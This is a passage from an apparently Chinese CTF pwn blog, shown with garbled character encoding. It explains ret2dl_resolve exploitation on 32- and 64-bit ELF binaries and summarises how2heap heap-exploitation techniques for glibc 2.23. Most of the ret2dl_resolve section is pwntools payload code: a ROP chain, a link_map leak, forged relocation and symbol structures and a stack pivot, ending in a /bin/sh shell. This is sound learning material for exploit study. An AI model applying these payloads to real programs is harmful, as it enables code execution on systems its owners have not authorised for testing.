è®¾ç½®writeçš„Elf32_Symç»“æ„ä½“æ—¶ï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤readelf -r binaryï¼Œæ‰¾åˆ°writeçš„r_infoåç§»ä¸º407ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516168.jpeg)\n\nä¹‹åè¾“å…¥objdump -s -j .dynsym level3ï¼ŒæŸ¥æ‰¾åç§»ä¸º4çš„Elf32_Symç»“æ„ä½“å†…å®¹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516927.jpeg)\n\nè¿™é‡Œå°±æ˜¯0x804820cï¼Œå¯¹åº”çš„å†…å®¹ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n\nst_name = 31000000\nst_value = 00000000\nst_size = 00000000\nst_info = 12\nst_other = 00\nst_shndx = 0000\n```\n\nâ–²å…¶å®åœ¨IDAä¸­çœ‹çš„æ›´æ¸…æ¥šï¼š![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516336.jpeg)\n\nåŒæ—¶ç”±äºæœå¯»æ•°æ®æ—¶ï¼Œéœ€è¦æŸ¥æ‰¾ç±»å‹R_386_JUMP_SLOTï¼Œè¯¥ç´¢å¼•ä¸ºr_infoçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦å°†r_infoçš„æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0x07ï¼Œæ¥é€šè¿‡æ£€æŸ¥ã€‚\n\nâ–²ä»¥ä¸‹ä¸ºä¸¤ä¸ªç»“æ„ä½“å†…å®¹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#Elf32_Relç»“æ„ä½“ï¼šå¤§å°ä¸º0x08\ntypedef struct {\n    Elf32_Addr r_offset;   // å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ­¤å€¼ä¸ºè™šæ‹Ÿåœ°å€\n    Elf32_Word r_info;     // ç¬¦å·è¡¨ç´¢å¼•\n} Elf32_Rel;\n\n\n#Elf32_Symç»“æ„ä½“ï¼šå¤§å°ä¸º0x10\ntypedef struct\n{\n    Elf32_Word st_name;      // Symbol name(string tbl index)\n    Elf32_Addr st_value;     // Symbol value\n    Elf32_Word st_size;      // Symbol size\n    unsigned char st_info;   // Symbol type and binding\n    unsigned char st_other;  // Symbol visibility under glibc>=2.2\n    Elf32_Section st_shndx;  // Section index\n} Elf32_Sym;\n```\n\n### (4)æ‰§è¡Œæµç¨‹\n\nå°†ä¼ªé€ çš„ç»“æ„ä½“å’Œå¿…è¦æ•°æ®æ”¾åœ¨bssæ–°æ ˆä¸Šï¼Œä»plt0_addrå¼€å§‹æ‰§è¡Œï¼Œè°ƒç”¨writeå‡½æ•°ï¼Œé‡æ–°è£…è½½writeå‡½æ•°ï¼ŒåŠ«æŒæˆsystemå‡½æ•°ï¼ŒåŒæ—¶ä¿®æ”¹å‚æ•°ä¸ºbinshï¼Œç›´æ¥getshellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\n#æ‰§è¡Œæ•°æ®ï¼š\npayload = \"\"\npayload += \"AAAA\"              #ä½äºnew_stack_addr,å ä½ç”¨äºpop ebp\npayload += p32(plt0_addr)      #ä½äºnew_stack_addr+0x04,è°ƒç”¨PLT[0]\npayload += p32(fake_reloc_arg) #ä½äºnew_stack_addr+0x08,ä¼ å…¥ä¼ªé€ çš„reloc_arg\npayload += p32(0)              #ä½äºnew_stack_addr+0x0c,systemå‡½æ•°è¿”å›å€¼\npayload += p32(binsh_addr)     #ä½äºnew_stack_addr+0x10,ä¿®æ”¹å‚æ•°ä¸º/bin/shå­—ç¬¦ä¸²åœ°å€\n\n#ä¼ªé€ çš„å†…å®¹æ•°æ®ï¼š\npayload += \"A\"*0x3c            #ä½äºnew_stack_addr+0x14,padding\npayload += fake_Elf32_Rel_data #ä½äºnew_stack_addr+0x50,Elf32_Relç»“æ„ä½“\npayload += \"AAAA\"              #ä½äºnew_stack_addr+0x58ï¼Œpadding\npayload += fake_Elf32_Sym_data #ä½äºnew_stack_addr+0x5c,Elf32_Symç»“æ„ä½“\npayload += \"system\\x00\\x00\"    #ä½äºnew_stack_addr+0x6c,ä¼ å…¥systemå‡½æ•°å\npayload += \"/bin/sh\\x00\"       #ä½äºnew_stack_addr+0x74,ä¼ å…¥binshå­—ç¬¦ä¸²\n\nio.send(payload)\nio.interactive()\n```\n\nâ–²ä¸åŒç‰ˆæœ¬çš„libcä¹Ÿä¸å¤ªä¸€æ ·ï¼Œåœ¨libc2.27åŠä»¥ä¸‹è¯•è¿‡éƒ½è¡Œï¼Œä½†2.30åŠä»¥ä¸Šå¥½åƒå°±ä¸å¯ä»¥ï¼Œå¯èƒ½ç‰ˆæœ¬æ”¹äº†å¤šäº†ä¸€äº›æ£€æŸ¥å§ã€‚\n\n \n\n# äºŒã€64ä½ç¨‹åºï¼š\n\n## 1.æ¡ä»¶å˜æ›´ï¼š\n\n### (1)ä¸¤å¤§ç»“æ„ä½“å‘ç”Ÿå˜åŒ–ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#Elf64_Relaç»“æ„ä½“ï¼šå¤§å°ä¸º0x18\ntypedef struct\n{\n  Elf64_Addr  r_offset;          /(0x08)* Address */\n  Elf64_Xword  r_info;           /(0x08)* Relocation type and symbol index */\n  Elf64_Sxword  r_addend;        /(0x08)* Addend */\n} Elf64_Rela;\n\n#Elf64_Symç»“æ„ä½“ï¼šå¤§å°ä¸º0x18\ntypedef struct\n{\n  Elf64_Word  st_name;           /(0x04)* Symbol name (string tbl index) */\n  unsigned char  st_info;        /(0x01)* Symbol type and binding */\n  unsigned char  st_other;       /(0x01)* Symbol visibility */\n  Elf64_Section  st_shndx;       /(0x02)* Section index */\n  Elf64_Addr  st_value;          /(0x08)* Symbol value */\n  Elf64_Xword  st_size;          /(0x08)* Symbol size */\n} Elf64_Sym;\n```\n\n![elf64_rel](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516705.png)\n\n![elf64_sym](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516393.png)\n\n### (2)å¯»å€æ–¹å¼å‘ç”Ÿå˜åŒ–\n\nä¸å†æ˜¯ç›´æ¥å¯»å€ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªæ•°ç»„å¯»å€ï¼Œå¹¶ä¸”å¦‚æœç´¢å¼•è¿‡å¤§ï¼Œä¼šé€ æˆæ•°ç»„è¶Šç•Œï¼Œç¨‹åºå´©æºƒã€‚è¿™é‡Œå°±éœ€è¦è®¾ç½®link_mapé‡Œçš„æŸäº›å‚æ•°ï¼Œç½®ä¸º0ï¼Œæ‰èƒ½è·³è¿‡å…¶ä¸­çš„åˆ¤æ–­è¯­å¥ï¼Œä½¿å¾—ä¼ªé€ çš„r_infoèƒ½å¤Ÿèµ·ä½œç”¨ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦å…ˆæ³„éœ²link_mapçš„åœ°å€ï¼š(æˆ–è€…ç›´æ¥ä¼ªé€ link_map)\n\nâ–² GOT+4(å³GOT[1])ä¸ºåŠ¨æ€åº“æ˜ å°„ä¿¡æ¯æ•°æ®ç»“æ„link_map åœ°å€ï¼›GOT+8(å³GOT[2])ä¸ºåŠ¨æ€é“¾æ¥å™¨ç¬¦å·è§£æå‡½æ•°çš„åœ°å€_dl_runtime_resolveã€‚\n\n### (3)æ•°ç»„ç´¢å¼•å¯¹é½\n\néœ€è¦è¿›è¡Œ0x18çš„å¯¹é½ï¼Œç¡®ä¿é€šè¿‡ç´¢å¼•n*0x18åˆ°çš„åœ°å€æ˜¯æˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“ã€‚\n\n## 2.æ€è€ƒexpç¼–å†™ï¼š\n\n### (1)å„ç§å‰ç½®åœ°å€ï¼š\n\n```\nvulfun_addr = 0x4005e6\nwrite_got = 0x600A58\nread_got = 0x600A60\nplt0_addr = 0x4004a0\nlink_map_got = 0x600A48\n#GOT[1]çš„åœ°å€\nleave_ret = 0x400618\npop_rdi_ret = 0x4006b3\npop_rbp_ret = 0x400550\n\nnew_stack_addr = 0x600d88 \n#ç¨‹åºè¿è¡Œèµ·æ¥æ‰ä¼šæœ‰ï¼Œbssä¸gotè¡¨ç›¸é‚»ï¼Œ_dl_fixupä¸­ä¼šé™ä½æ ˆåä¼ å‚ï¼Œè®¾ç½®ç¦»bssé¦–åœ°å€è¿œä¸€ç‚¹é˜²æ­¢å‚æ•°å†™å…¥éæ³•åœ°å€å‡ºé”™\n\nrelplt_addr = 0x400420 \n#.rel.pltçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“Elf64_Relaåç§»æ„é€ reloc_arg\n\ndynsym_addr = 0x400280\n#.dynsymçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„Elf64_Symç»“æ„ä½“åç§»æ„é€ Elf64_Rela.r_info\n\ndynstr_addr = 0x400340\n#.dynstrçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„å‡½æ•°åå­—ç¬¦ä¸²systemåç§»æ„é€ Elf64_Sym.st_name\n```\n\n### (2)æ³„éœ²link_mapçš„åœ°å€:\n\n```\n#æ³¨é‡Šå¤´\n\nuniversal_gadget1 = 0x4006aa\t\n#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn\nuniversal_gadget2 = 0x400690\t\n#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]\n\n#ä½¿ç”¨ä¸‡èƒ½gadgetsè°ƒç”¨writeæ³„éœ²link_mapåœ°å€\npayload = \"\"\npayload += 'A'*136 #padding\npayload += p64(universal_gadget1) \npayload += p64(0x0)\npayload += p64(0x1) #rbpï¼Œéšä¾¿è®¾ç½®\npayload += p64(write_got)\npayload += p64(0x8)\npayload += p64(link_map_got)\npayload += p64(0x1)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #æ ˆä¿®æ­£\npayload += p64(vulfun_addr) #è¿”å›åˆ°vulnerable_functionå¤„\n\nio.send(payload)\nio.recvuntil(\"Input:\\n\")\nlink_map_addr = u64(io.recv(8))\nlog.info(\"Leak link_map address:%#x\" %(link_map_addr))\n```\n\n### (3)è¿›è¡Œæ ˆåŠ«æŒï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += 'A'*136 #padding\npayload += p64(universal_gadget1) \npayload += p64(0x0)\npayload += p64(0x1)\npayload += p64(read_got) #ä½¿ç”¨ä¸‡èƒ½gadgetsè°ƒç”¨readå‘æ–°æ ˆä¸­å†™å…¥æ•°æ®\npayload += p64(0x500)\npayload += p64(new_stack_addr)\npayload += p64(0x0)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #æ ˆä¿®æ­£\n\npayload += p64(pop_rbp_ret) \n#è¿”å›åˆ°pop rbp; retnï¼ŒåŠ«æŒæ ˆã€‚æ­¤å¤„ç›´æ¥åŠ«æŒæ ˆæ˜¯å› ä¸ºå¦‚æœç»§ç»­ä¿®æ”¹link_map+0x1c8ä¼šå¯¼è‡´ROPé“¾è¿‡é•¿ï¼Œæ ˆä¸Šçš„ç¯å¢ƒå˜é‡æŒ‡é’ˆè¢«ç ´åï¼Œä»è€Œå¯¼è‡´systemå¤±è´¥ã€‚\npayload += p64(new_stack_addr)\npayload += p64(leave_ret)\n\nio.send(payload)\n```\n\n### (4)ä¼ªé€ ä¸¤å¤§ç»“æ„ä½“å’Œå¿…è¦æ•°æ®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_Elf64_Rela_base_addr = new_stack_addr + 0x150 \n#æ–°æ ˆä¸Šé€‰æ‹©ä¸€å—åœ°å€ä½œä¸ºä¼ªé€ çš„Elf64_Relaç»“æ„ä½“åŸºå€ï¼Œç¨åè¿˜è¦é€šè¿‡è®¡ç®—è¿›è¡Œ0x18å­—èŠ‚å¯¹é½\n\nfake_Elf64_Sym_base_addr = new_stack_addr + 0x190\n#æ–°æ ˆä¸Šé€‰æ‹©ä¸€å—åœ°å€ä½œä¸ºä¼ªé€ çš„Elf64_Symç»“æ„ä½“åŸºå€ï¼Œç¨åè¿˜è¦é€šè¿‡è®¡ç®—è¿›è¡Œ0x18å­—èŠ‚å¯¹é½ï¼Œä¸ä¸Šä¸€ä¸ªç»“æ„ä½“ä¹‹é—´ç•™å‡ºä¸€æ®µé•¿åº¦é˜²æ­¢é‡å \n\nfake_st_name = new_stack_addr + 0x1c0 - dynstr_addr \n#è®¡ç®—ä¼ªé€ çš„st_nameæ•°å€¼ï¼Œä¸ºä¼ªé€ å‡½æ•°å­—ç¬¦ä¸²systemä¸.dynstrèŠ‚å¼€å¤´é—´çš„åç§»\n\nbinsh_addr = new_stack_addr + 0x1c8 \n#\"/bin/sh\\x00\"æ‰€åœ¨åœ°å€ï¼Œè®¡ç®—å¾—åˆ°çš„\n\n#è®¡ç®—ä¸¤ä¸ªç»“æ„ä½“çš„å¯¹é½å¡«å……å­—èŠ‚æ•°ï¼Œä¸¤ä¸ªç»“æ„ä½“å¤§å°éƒ½æ˜¯0x18\nrel_plt_align = 0x18 - (fake_Elf64_Rela_base_addr - relplt_addr) % 0x18 \nrel_sym_align = 0x18 - (fake_Elf64_Sym_base_addr - dynsym_addr) % 0x18\n\n#åŠ ä¸Šå¯¹é½å€¼åä¸ºç»“æ„ä½“çœŸæ­£åœ°å€\nfake_Elf64_Rela_addr = fake_Elf64_Rela_base_addr + rel_plt_align \nfake_Elf64_Sym_addr = fake_Elf64_Sym_base_addr + rel_sym_align\n\nfake_reloc_arg = (fake_Elf64_Rela_addr - relplt_addr)/0x18 \n#è®¡ç®—ä¼ªé€ çš„reloc_argï¼Œç”±äºæ˜¯æ•°ç»„ç´¢å¼•ä¸‹æ ‡ï¼Œæ‰€ä»¥éœ€è¦é™¤ä»¥ç»“æ„ä½“å¤§å°0x18\n\nfake_r_info = (((fake_Elf64_Sym_addr - dynsym_addr)/0x18) << 0x20) | 0x7 \n#ä¼ªé€ r_infoï¼Œåç§»è¦è®¡ç®—æˆä¸‹æ ‡ï¼Œé™¤ä»¥Elf64_Symçš„å¤§å°ï¼Œæœ€åä¸€å­—èŠ‚ä¸º0x7\n\n\nfake_Elf64_Rela_data = \"\"\nfake_Elf64_Rela_data += p64(write_got) \n#r_offset = write_gotï¼Œä»¥å…é‡å®šä½å®Œæ¯•å›å¡«gotè¡¨çš„æ—¶å€™å‡ºç°éæ³•å†…å­˜è®¿é—®é”™è¯¯\nfake_Elf64_Rela_data += p64(fake_r_info)\nfake_Elf64_Rela_data += p64(0)\n\nfake_Elf64_Sym_data = \"\"\nfake_Elf64_Sym_data += p32(fake_st_name)\nfake_Elf64_Sym_data += p8(0x12)\n#åé¢çš„æ•°æ®ç›´æ¥å¥—ç”¨writeå‡½æ•°çš„Elf64_Symç»“æ„ä½“ï¼Œè¿™é‡Œè¦æ³¨æ„æ•°æ®å¤§å°\nfake_Elf64_Sym_data += p8(0)\nfake_Elf64_Sym_data += p16(0)\nfake_Elf64_Sym_data += p64(0)\nfake_Elf64_Sym_data += p64(0)\n```\n\n### (5)æ‰§è¡Œæµç¨‹\n\nå°†link_map+0x1c8ç½®0ä¹‹åï¼Œç›´æ¥å†æ¬¡é‡å®šä½writeå‡½æ•°ï¼ŒåŠ«æŒä¸ºsystemå‡½æ•°ï¼Œgetshell:\n\n```\n#æ³¨é‡Šå¤´\n\n#ä½¿ç”¨ä¸‡èƒ½gadgetsè°ƒç”¨readæŠŠlink_map+0x1c8ç½®ä¸º0\npayload = \"\"\npayload += \"AAAAAAAA\"\npayload += p64(universal_gadget1)\npayload += p64(0x0)\npayload += p64(0x1) #rbpè®¾ç½®ä¸º1\npayload += p64(read_got)\npayload += p64(0x8)\npayload += p64(link_map_addr + 0x1c8)\npayload += p64(0x0)\npayload += p64(universal_gadget2)\npayload += 'A'*0x38 #æ ˆä¿®æ­£\n\n#ä¸ºsystemå‡½æ•°è®¾ç½®å‚æ•°\"/bin/sh\\x00\"ï¼Œç”±äºplt[0]å‡½æ•°è°ƒç”¨é‡å®šä½å–å‚ä»ç„¶æ˜¯ä»æ ˆä¸Šå–ï¼Œä¸ä¼šç”¨åˆ°rdiå¯„å­˜å™¨ä¼ å‚ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥å…ˆä¼ å‚ä¹Ÿå¯ã€‚\npayload += p64(pop_rdi_ret) \npayload += p64(binsh_addr)\n\npayload += p64(plt0_addr)\npayload += p64(fake_reloc_arg)\npayload = payload.ljust(0x150, \"A\") #padding\n\npayload += 'A'*rel_plt_align\npayload += fake_Elf64_Rela_data\npayload = payload.ljust(0x190, \"A\") #padding\n\npayload += 'A'*rel_sym_align\npayload += fake_Elf64_Sym_data\npayload = payload.ljust(0x1c0, \"A\") #padding\npayload += \"system\\x00\\x00\"\npayload += \"/bin/sh\\x00\"\n\nio.send(payload) #å†™å…¥è¯¥æ®µpayload,å°†æ•°æ®è¯»å–åˆ°æ–°æ ˆ\nio.send(p64(0)) #æ‰§è¡Œæ–°æ ˆä¸Šçš„ç›¸å…³ä»£ç ï¼Œè®¾ç½®link_map+0x1c8ä¸º0ã€‚\n\nio.interactive()\n```\n\nâ–²å…¶å®è¿˜æ˜¯ä¸€çŸ¥åŠè§£ï¼Œç­‰å…ˆæ‰“å®ŒåŸºç¡€å†æ¥æ·±ç©¶å§ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://wiki.x10sec.org/pwn/linux/stackoverflow/advanced-rop-zh/\n\nhttps://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=44816&ctid=157\n\nhttps://syst3mfailure.github.io/ret2dl_resolve\n\nhttps://xz.aliyun.com/t/5722\n","tags":["First"],"categories":["PWN","RROP0xa"]},{"title":"how2heap_libc2.23_summary","url":"/2021/08/14/how2heap_libc2.23_summary/","content":"\n1.first_fit:\n\nunsortedbinä¸­åˆ‡å‰²åŸåˆ™ï¼Œå¸¸ç”¨æ¥æ³„éœ²åœ°å€\n\n \n\n2.fastbin_dupï¼š\n\n```\n#æ³¨é‡Šå¤´\n\na=malloc(x),b=malloc(x),c=mallox(x)\nfree(a),free(b),free(a)\nmalloc(x)=a,malloc(x)=b,malloc(x)=a\n```\n\n \n\n3.fastbin_dup_into_stack:\n\n```\n#æ³¨é‡Šå¤´\n\na=malloc(x),b=malloc(x),c=mallox(x)\nfree(a),free(b),free(a)\n\n//malloc(x)å¾—åˆ°aï¼Œæ­¤æ—¶aè¿˜åœ¨fastbinä¸­ï¼Œä¹‹åä¿®æ”¹açš„fdä¸ºfakechunkï¼Œä½¿å¾—:\nfastbinsY.fd->b,b.fd->a,a.fd->fakechunk\n\n//å†æ¬¡ç”³è¯·å¾—åˆ°fakechunk\nmalloc(x)=b,malloc(x)=a,malloc(x)=fakechunk\n//è¿™é‡Œå°±å¯ä»¥ä½¿å¾—fakechunkä½äºæ ˆä¸Šï¼Œä»è€Œä½¿å¾—å †åˆ†é…åˆ°æ ˆä¸­æ§åˆ¶æ ˆä¸Šçš„åŸå…ˆä¸å¯æ§æ•°æ®ã€‚\n```\n\n \n\n4.fastbin_dup_consolidate\n\n```\n#æ³¨é‡Šå¤´\n\na=malloc(x),b=malloc(x)\nfree(a)//aè¿›å…¥fastbinä¸­\n\nc = malloc(0x400)\n//ç”³è¯·large binçš„æ—¶å€™å·²ç»æ‰§è¡Œäº†malloc_consolidateï¼Œä½¿å¾—fastbinä¸­çš„aæ”¾å…¥smallbinä¸­\n\nfree(a)\n//å¹¶ä¸ä¼šæŠ¥é”™,å› ä¸ºè¿™ä¸ªæ—¶å€™aå·²ç»è¢«æ”¾åˆ°äº†smallbinä¹‹ä¸­,fastbinä¸­æ²¡æœ‰a,ä¹‹åaå†æ¬¡è¿›å…¥fastbinä¸­\n\n//æ­¤æ—¶çš„aä¸­ä¿¡æ¯å¦‚ä¸‹ï¼š\na.bk->smallbin\na.fd->0//ç”±äºå¤„åœ¨fastbinçš„ç¬¬ä¸€ä¸ªï¼Œæ‰€ä»¥fdè¢«æ¸…ç©º\n\nmalloc(x) = a//è¿™æ—¶å€™aä¸­å­˜åœ¨smallbinçš„ä¿¡æ¯ï¼Œå¯ä»¥è¿›è¡Œæ³„éœ²\nmalloc(x) = a//å¯ä»¥å†æ¬¡ç”³è¯·ï¼Œå†æ¬¡å¾—åˆ°a\n```\n\n \n\n5.house_of_einherjarï¼š\n\nåœ¨å½“å‰chunkä¸­æ„é€ fakechunkï¼Œåˆ©ç”¨æº¢å‡ºæ¼æ´ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„presizeå’Œpre_inuseã€‚ä¹‹åé‡Šæ”¾ä¸‹ä¸€ä¸ªchunkè¿ä¸Šfakechunkä¸€èµ·è¿›å…¥Binsä¸­ï¼Œå†é€šè¿‡å½“å‰chunkä¿®æ”¹è¿›å…¥binsä¸­chunkçš„fd,bkï¼Œä»è€Œå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚\n\n(1)ç”³è¯·ä¸‰ä¸ªchunkï¼Œchunk1,chunk2,chunk3\n\n(2)åœ¨chunk1ä¸­åˆ¶é€ fakechunk//è¿™é‡Œéœ€è¦ç»•è¿‡ä¸€äº›æ£€æŸ¥\n\nâ‘ æ„é€ ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_chunk->size = sizeof(chunk1)-0x10\n```\n\nç»•è¿‡pre_sizeçš„æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))     \n      malloc_printerr (\"corrupted size vs. prev_size\");\n```\n\nè¿™æ®µä»£ç æ„æ€å°±æ˜¯å½“å‰chunkçš„sizeå¦‚æœä¸ç­‰äºä¸‹ä¸€ä¸ªchunkçš„pre_sizeåŸŸï¼Œåˆ™å‡ºé”™\n\nâ‘¡æ„é€ ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_chunk->fd = chunk1\nfake_chunk->bk = chunk1\n```\n\nç»•è¿‡åŒå‘é“¾è¡¨çš„æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))      \n      malloc_printerr (\"corrupted double-linked list\");\n```\n\nè¿™æ®µä»£ç æ„æ€å°±æ˜¯ä¸‹ä¸€ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯BKï¼Œå…¶fdä¸ç­‰äºå½“å‰chunkåœ°å€ï¼Œæˆ–è€…ä¸Šä¸€ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯FDï¼Œå…¶bkä¸ç­‰äºå½“å‰chunkåœ°å€ï¼Œæ»¡è¶³å…¶ä¸­ä¸€ä¸ªå°±å‡ºé”™ã€‚\n\n(3)åˆ©ç”¨æº¢å‡ºæ¼æ´ï¼Œæ”¹æ‰chunk2çš„pre_sizeå’Œpre_inuseï¼Œfreeæ‰chunk2,è¿™æ ·fakechunk+chunk2ä¸€èµ·è¢«æ”¾å…¥binsä¸­ï¼Œå½¢æˆchunkA\n\n(4)é€šè¿‡chunk1ä¿®æ”¹chunkAçš„fd,bkï¼Œä½¿å…¶æŒ‡å‘æƒ³æ›´æ”¹çš„åœ°å€addr\n\n(5)å†malloc(sizeof(fakechunk+chunk2))å°±å¯ä»¥å¾—åˆ°é¦–åœ°å€ä¸ºfakechunkï¼Œå¤§å°ä¸ºfakechunk+chunk2çš„chunkAäº†ã€‚ä¹‹åå†mallocä¸€æ¬¡å°±å¾—åˆ°addrçš„chunk\n\n \n\n6.house_of_forceï¼šé€šè¿‡ä¿®æ”¹topchunkçš„sizeåŸŸè·å¾—ä»»æ„è¯»å†™çš„chunk\n\n(1)ä¿®æ”¹topchunkçš„sizeåŸŸï¼Œä½¿ä¹‹å˜æˆä¸€ä¸ªå¤§æ•°ã€‚\n\n(2)malloc(-size)ã€‚è¦ç¡®ä¿è¿™ä¸ª-size<topchunk.size(è¡¥ç å½¢å¼)\n\n(3)ä¹‹åtopchunkå°±ä¼šè¢«æŠ¬å‡åˆ°-(size-0x10)çš„ä½ç½®(chunkå†…å­˜å¯¹é½çš„åŸå› ï¼Œå…·ä½“è°ƒè¯•ä¸€ä¸‹å°±èƒ½åˆ¤æ–­è¢«æŠ¬å‡åˆ°å“ªé‡Œäº†ï¼šp main_arena.top)ç„¶åæ‰ä¼šä»è¢«æŠ¬å‡ä¹‹åçš„topchunkå¼€å§‹åˆ†é…sizeå¤§å°çš„chunkã€‚\n\n(4)è¿™æ—¶å€™å†æ­£å¸¸mallocï¼Œå°±å¯åˆ†é…åˆ°ä»è¢«æŠ¬å‡ä¹‹ååˆ†é…å®Œsizeçš„topchunkåœ°å€å¤„åˆ‡å‰²çš„chunkäº†ï¼Œå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚\n\n \n\n7.house_of_loreï¼š\n\né’ˆå¯¹small binè¿›è¡Œæ”»å‡»çš„ï¼Œå¦‚æœé¢˜ç›®è®¾ç½®mallocå¤§å°é™åˆ¶å¤§äºfastbinæ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨äº†ã€‚\n\n(1)åˆ†é…ä¸€ä¸ªsmall binå¤§å°çš„chunk_ptrï¼Œå’Œå¦ä¸€ä¸ªchunk ç”¨æ¥é—´éš” top chunkã€‚\n\n(2)åœ¨æ ˆä¸Šä¼ªé€ ä¸¤ä¸ªåœ°å€fake chunk1å’Œfake chunk2ï¼Œä»smallbinä¸­ç”³è¯·éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š\n\nâ‘ // è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚\n\nbck = victim->bk;\n\nâ–²éœ€è¦è®¾ç½®chunk_ptr->bk = fake chunk1\n\nâ‘¡// æ£€æŸ¥ bck->fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€ \n\n```\n#æ³¨é‡Šå¤´\n\nif (__glibc_unlikely(bck->fd != victim)) {\n     errstr = \"malloc(): smallbin double linked list corrupted\";\n     goto errout;\n}\n```\n\nâ–²éœ€è¦è®¾ç½®fake chunk1->fd = chunk_ptrï¼ŒåŒæ—¶ç”±äºä¹‹åç”³è¯·fake chunk1æ—¶ä¹Ÿéœ€è¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦è®¾ç½®fake chunk2->fd = fake chunk1ï¼Œfake chunk1->bk = fake chunk2\n\n(3)é‡Šæ”¾æ‰chunk_ptrï¼Œå”¯ä¸€éœ€è¦æ¼æ´åˆ©ç”¨çš„æ˜¯è®¾ç½®victim->bk = fake chunk1ï¼Œè¿™é‡Œéœ€è¦è·å–æ ˆä¸Šçš„åœ°å€ï¼Œå¹¶ä¸”å­˜åœ¨ç±»ä¼¼UAFæ¼æ´ä¹‹ç±»çš„æ¥è®¾ç½®bkæŒ‡é’ˆã€‚è®¾ç½®ä¹‹åç°åœ¨smallbiné“¾è¡¨ä¸­ç»“æ„ä¸ºfake chunk2->fake chunk1->chunk_ptrã€‚\n\n(4)ä¹‹åç”³è¯·sizeof(chunk_ptr)ï¼Œå°†ä¹‹ç”³è¯·å‡ºæ¥ï¼Œå†ç”³è¯·ä¸€æ¬¡å³å¯å°†fake chun1ç”³è¯·å‡ºæ¥ï¼Œå®ç°ä»»æ„åœ°å€ç”³è¯·å †å—ã€‚\n\nâ–²æ³¨æ„è¿™é‡Œé’ˆå¯¹smallbinçš„æ”»å‡»æ˜¯ä¸éœ€è¦è®¾ç½®sizeä½çš„ï¼Œä¸å­˜åœ¨è¿™æ–¹é¢çš„æ¡ä»¶ã€‚\n\n \n\n8.house_of_orangeï¼šæ— freeå‡½æ•°çš„æ³„éœ²åœ°å€\n\n(1)ä¿®æ”¹topchunkçš„sizeåŸŸï¼Œä½¿ä¹‹å˜å°ï¼Œä½†éœ€è¦æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ï¼š\n\nâ‘ ä¼ªé€ çš„ size å¿…é¡»è¦å¯¹é½åˆ°å†…å­˜é¡µï¼Œä¾‹å¦‚topchunk_addr+topchunk_size=0x1000*xã€‚\n\nâ‘¡size è¦å¤§äº MINSIZE(0x10)\n\nâ‘¢size è¦å°äºä¹‹åç”³è¯·çš„ chunk size + MINSIZE(0x10)\n\nâ‘£size çš„ prev inuse ä½å¿…é¡»ä¸º 1\n\nç”¨äºé€šè¿‡ä¹‹åæ‹“å±•topchunkçš„sysmallocå‡½æ•°ä¸­çš„ä¸‹åˆ—æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nassert((old_top == initial_top(av) && old_size == 0) ||\n     ((unsigned long) (old_size) >= MINSIZE &&\n      prev_inuse(old_top) &&\n      ((unsigned long)old_end & pagemask) == 0));\n```\n\n(2)ç”³è¯·ä¸€ä¸ªå¤§äºä¼ªé€ ä¹‹åtopchunk_sizeï¼Œå°äº128K(0x1f400)çš„chunkã€‚å‰è€…æ˜¯ä¸ºäº†è°ƒç”¨sysmallocå‡½æ•°ï¼Œåè€…æ˜¯ä¸ºäº†ä½¿å¾—åˆ†é…æ–¹å¼ä¸ºbrkæ‹“å±•topchunkã€‚\n\nâ‘ 